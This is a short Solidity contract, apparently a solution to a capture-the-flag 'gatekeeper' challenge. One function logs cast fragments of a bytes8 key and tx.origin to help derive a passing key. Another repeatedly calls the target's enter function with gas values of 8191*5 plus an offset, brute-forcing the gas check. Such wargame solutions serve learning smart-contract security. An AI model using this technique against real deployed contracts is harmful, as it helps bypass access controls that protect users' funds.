pragma solidity ^0.6.0;


contract GatekeeperBreak {

  event input(bytes8 key, address tx);
  event lhs(uint32 one, uint32 two, uint32 three);
  event rhs(uint16 one, uint64 two, uint16 three);

  function test(bytes8 key) public {
      uint32 one_lhs = uint32(uint64(key));
      uint16 one_rhs = uint16(uint64(key));
      uint64 two_rhs = uint64(key);
      uint16 three_rhs = uint16(tx.origin);

      emit input(key, tx.origin);
      emit lhs(one_lhs, one_lhs, one_lhs);
      emit rhs(one_rhs, two_rhs, three_rhs);
  }

  function call(address _addr, bytes8 key) public {
    for (uint256 i=0 ; i< 300;i++) {
      _addr.call{gas: 8191*5 + i}(
            abi.encodeWithSignature("enter(bytes8)", key)
        );
    }
  }

}